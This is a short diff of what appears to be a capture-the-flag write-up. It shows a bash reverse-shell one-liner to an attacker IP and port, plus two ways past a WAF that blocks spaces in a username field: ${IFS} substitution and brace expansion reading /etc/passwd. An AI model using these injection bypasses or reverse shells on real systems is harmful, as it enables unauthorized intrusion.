@@ -184,7 +184,8 @@ bash -i >& /dev/tcp/10.10.14.120/4444 0>&1
 and a white space error appear as if there is WAF preventing us from passing any white spaces into the username field.
 Looking online I found to methods to bypass this WAF rule:
 
-1- Replacing ' ' by ${IFS} <--Internal Field Separator
+1- Replacing ' ' by ${IFS} <--Internal Field Separatorز
+
 2- Replacing ' ' by brace expansion using {cat,/etc/passwd} which will interpreted in the terminal as 'cat /etc/passwd'
 
 The space error did not appear once i used any of the two bypassing method above but for some reason I was not receiving a shell back in my listener.
